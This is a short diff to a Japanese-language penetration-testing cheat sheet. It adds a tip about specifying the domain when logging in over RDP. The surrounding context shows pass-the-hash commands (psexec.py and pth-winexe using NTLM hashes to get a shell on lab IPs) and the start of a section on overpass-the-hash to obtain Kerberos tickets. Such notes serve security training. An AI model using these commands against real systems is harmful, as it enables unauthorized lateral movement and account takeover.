@@ -217,6 +217,8 @@ psexec.py Administrator@10.10.3.190 -hashes aad3b435b51404eeaad3b435b51404ee:0e0
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 ```
 
+**パスワード合ってるはずなのに入れない場合は”ドメイン”を指定せよ！**（rdesktopの`-d`とか）
+
 ## Over Pass The Hash
 
 Overpass the hashとは、NTLM のユーザハッシュを「オーバー」悪用して、完全な Kerberos の Ticket Granting Ticket(TGT)やサービスチケットを獲得することであり、これにより、 そのユーザとして別のマシンやサービスにアクセスすることが可能となります。
